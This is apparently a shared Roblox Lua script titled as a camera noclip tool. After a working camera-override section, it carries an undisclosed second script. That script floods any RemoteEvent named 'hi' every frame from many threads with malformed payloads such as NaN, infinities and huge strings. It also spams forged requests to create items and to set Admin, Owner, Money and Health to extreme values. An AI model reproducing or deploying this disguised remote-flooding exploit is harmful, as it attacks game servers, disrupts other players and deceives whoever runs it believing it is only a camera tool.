scripts.title: Best camera noclip
scripts.script:
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Force max zoom limits on the engine
player.CameraMaxZoomDistance = 99999
player.CameraMinZoomDistance = 0.5

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local ToggleButton = Instance.new("TextButton")
ToggleButton.Parent = ScreenGui
ToggleButton.Size = UDim2.new(0, 160, 0, 50)
ToggleButton.Position = UDim2.new(0.05, 0, 0.4, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "Server Cam: LOCKED"

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = ToggleButton

-- DRAGGABLE CODE STRUCTURE
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    ToggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = ToggleButton.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- CAMERA CONTROLS AND ZOOM MATHEMATICS
local isOverriding = false
local rotX, rotY = 0, 0
local defaultDistance = 15
local connection
local activeTouches = {}

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not isOverriding or gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Touch then
        activeTouches[input] = input.Position
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        activeTouches[input] = nil
    end
end)

UserInputService.InputChanged:Connect(function(input, gameProcessed)
    if not isOverriding then return end
    if gameProcessed and input.UserInputType ~= Enum.UserInputType.MouseWheel then return end
    
    if input.UserInputType == Enum.UserInputType.MouseWheel then
        defaultDistance = math.clamp(defaultDistance - (input.Position.Z * 4), 5, 99999)
        return
    end

    local touchCount = 0
    local fingers = {}
    for inp, pos in pairs(activeTouches) do
        touchCount = touchCount + 1
        table.insert(fingers, inp)
    end

    -- Mobile Pinch Zoom
    if touchCount == 2 and input.UserInputType == Enum.UserInputType.Touch then
        activeTouches[input] = input.Position
        
        local f1 = fingers[1].Position
        local f2 = fingers[2].Position
        local currentDist = (f1 - f2).Magnitude
        
        local p1 = fingers[1].Delta
        local p2 = fingers[2].Delta
        local prevDist = ((f1 - p1) - (f2 - p2)).Magnitude
        
        local change = currentDist - prevDist
        defaultDistance = math.clamp(defaultDistance - (change * 0.15), 5, 99999)
        
    -- Drag to look
    elseif touchCount <= 1 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        -- This logic ignores input adjustments if you are dragging the UI button itself
        if dragging then return end
        rotX = rotX - input.Delta.X * 0.4
        rotY = math.clamp(rotY - input.Delta.Y * 0.4, -75, 75)
    end
end)

local function startCameraOverride()
    connection = RunService.RenderStepped:Connect(function()
        if isOverriding then
            camera.CameraType = Enum.CameraType.Scriptable
            
            local target = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if not target then return end
            
            local seat = player.Character.Humanoid.SeatPart
            if seat and seat.Parent then
                target = seat.Parent.PrimaryPart or seat
            end
            
            local startCFrame = CFrame.new(target.Position)
            local rotationCFrame = CFrame.Angles(0, math.rad(rotX), 0) * CFrame.Angles(math.rad(rotY), 0, 0)
            
            camera.CFrame = startCFrame * rotationCFrame * CFrame.new(0, 2, defaultDistance)
        end
    end)
end

ToggleButton.MouseButton1Click:Connect(function()
    -- Only toggle if we weren't just dragging the button across the screen
    if dragging then return end
    
    isOverriding = not isOverriding
    table.clear(activeTouches)
    
    if isOverriding then
        ToggleButton.Text = "Server Cam: OVERRIDDEN"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
        
        local _, y, _ = camera.CFrame:ToOrientation()
        rotX = math.deg(y)
        rotY = 0
    else
        ToggleButton.Text = "Server Cam: LOCKED"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
        
        camera.CameraType = Enum.CameraType.Custom
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            camera.CameraSubject = player.Character.Humanoid
        end
    end
end)

startCameraOverride()

local Players    = game:GetService("Players")
local RunService = game:GetService("RunService")

local function makeBadPayloads()
    local list = {}

    list[#list+1] = nil
    list[#list+1] = 0/0
    list[#list+1] = math.huge
    list[#list+1] = -math.huge
    list[#list+1] = 2^53
    list[#list+1] = -2^53
    list[#list+1] = 1e308 * 10
    list[#list+1] = string.rep("A", 200000)
    list[#list+1] = string.rep("\0", 10000)
    list[#list+1] = ("%s"):rep(5000)
    list[#list+1] = workspace
    list[#list+1] = game
    list[#list+1] = function() end
    list[#list+1] = coroutine.running()

    do
        local root = {}
        local cur = root
        for i = 1, 100 do cur.next = {}; cur = cur.next end
        list[#list+1] = root
    end

    list[#list+1] = { [1]="a", ["1"]="b", [true]="c", [workspace]="d" }

    do
        local c = {}
        c.self = c
        list[#list+1] = c
    end

    list[#list+1] = true
    list[#list+1] = "not_a_number"
    list[#list+1] = { Name = workspace, Value = 0/0, Amount = math.huge, Price = -1, Id = "x" }
    list[#list+1] = Vector3.new(0/0, math.huge, -math.huge)
    list[#list+1] = CFrame.new(0/0, 0, 0)

    return list
end

local remotes = {}
local function refreshRemotes()
    local found = {}
    for _, d in ipairs(game:GetDescendants()) do
        if d:IsA("RemoteEvent") and d.Name == "hi" then
            found[#found+1] = d
        end
    end
    remotes = found
end

task.spawn(function()
    while true do
        refreshRemotes()
        task.wait(0.5)
    end
end)

local THREADS = 12

for i = 1, THREADS do
    task.spawn(function()
        while true do
            RunService.Heartbeat:Wait()

            for _, remote in ipairs(remotes) do
                for _, payload in ipairs(makeBadPayloads()) do
                    task.spawn(function()
                        pcall(function()
                            remote:FireServer(payload)
                        end)
                    end)
                end

                task.spawn(function()
                    pcall(function()
                        for _ = 1, 20 do
                            remote:FireServer(nil)
                            remote:FireServer(0/0)
                            remote:FireServer(math.huge)
                            remote:FireServer({ Name = "x", Value = 0/0, Amount = math.huge })
                        end
                    end)
                end)
            end
        end
    end)
end

local function sendCreateRequests()
    for _, remote in ipairs(remotes) do
        task.spawn(function()
            pcall(function()
                remote:FireServer("Create", "Part")
                remote:FireServer("Create", "Model")
                remote:FireServer("Create", "Tool")
                remote:FireServer("Create", "Vehicle")
                remote:FireServer("Create", "House")
                remote:FireServer("Create", "Base")

                remote:FireServer("Create", "Weapon")
                remote:FireServer("Create", "Currency")
                remote:FireServer("Create", "Admin")
                remote:FireServer("Create", "All")
                remote:FireServer("Create")

                remote:FireServer({ Action = "Create", Type = "All", Amount = math.huge })
                remote:FireServer({ Action = "Create", Type = "Part", Count = 999999 })
                remote:FireServer({ Action = "Create", Type = "Model", Count = 0/0 })

                for i = 1, 50 do
                    remote:FireServer("Create", "All")
                    remote:FireServer({ Action = "Create", Type = "Everything", Count = math.huge })
                end
            end)
        end)
    end
end

task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        sendCreateRequests()
    end
end)

local function sendModifyRequests()
    for _, remote in ipairs(remotes) do
        task.spawn(function()
            pcall(function()
                remote:FireServer("Modify", "Health", 999999)
                remote:FireServer("Modify", "Speed", math.huge)
                remote:FireServer("Modify", "Jump", 0/0)
                remote:FireServer("Modify", "Damage", -999999)
                remote:FireServer("Modify", "Money", 2^53)
                remote:FireServer("Modify", "Level", math.huge)
                remote:FireServer("Modify", "Stat", "All")

                remote:FireServer({ Action = "Modify", Stat = "Health", Value = math.huge })
                remote:FireServer({ Action = "Modify", Stat = "Speed", Value = 0/0 })
                remote:FireServer({ Action = "Modify", Stat = "All", Value = 999999 })
                remote:FireServer({ Action = "Set", Key = "Admin", Value = true })
                remote:FireServer({ Action = "Set", Key = "Owner", Value = true })

                for i = 1, 50 do
                    remote:FireServer("Modify", "All", math.huge)
                    remote:FireServer({ Action = "Modify", Stat = "All", Value = 0/0 })
                end
            end)
        end)
    end
end

task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        sendModifyRequests()
    end
end)

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")

        local parts = {}
        for i = 1, 10 do
            local part = Instance.new("Part")
            part.Anchored   = true
            part.CanCollide = false
            part.Size       = Vector3.new(1, 1, 1)
            part.Color      = Color3.fromHSV(i / 10, 1, 1)
            part.Material   = Enum.Material.Neon
            part.Parent     = workspace
            parts[#parts + 1] = part
        end

        local conn
        conn = RunService.Heartbeat:Connect(function()
            if hrp and hrp.Parent then
                for i, part in ipairs(parts) do
                    local offset = Vector3.new(
                        math.cos(os.clock() * 2 + i) * 3,
                        3 + i,
                        math.sin(os.clock() * 2 + i) * 3
                    )
                    part.Position = hrp.Position + offset
                end
            else
                conn:Disconnect()
                for _, p in ipairs(parts) do p:Destroy() end
            end
        end)
    end)
end)
